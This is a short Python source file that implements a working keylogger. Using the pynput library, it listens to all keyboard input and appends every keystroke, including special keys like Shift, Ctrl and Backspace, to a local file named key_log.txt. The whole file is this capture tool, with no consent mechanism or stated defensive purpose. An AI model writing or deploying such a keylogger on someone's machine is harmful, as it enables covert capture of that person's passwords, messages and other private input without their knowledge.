from pynput import keyboard

# File to store the logged keys
log_file = "key_log.txt"

def on_press(key):
    """Callback function that is called whenever a key is pressed."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[Backspace]")
            elif key == keyboard.Key.shift:
                f.write("[Shift]")
            elif key == keyboard.Key.ctrl:
                f.write("[Ctrl]")
            elif key == keyboard.Key.alt:
                f.write("[Alt]")
            elif key == keyboard.Key.tab:
                f.write("[Tab]")
            elif key == keyboard.Key.esc:
                f.write("[Esc]")
            else:
                f.write(f" [{key}] ")

def main():
    """Main function to start the keylogger."""
    # Listen to keyboard events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
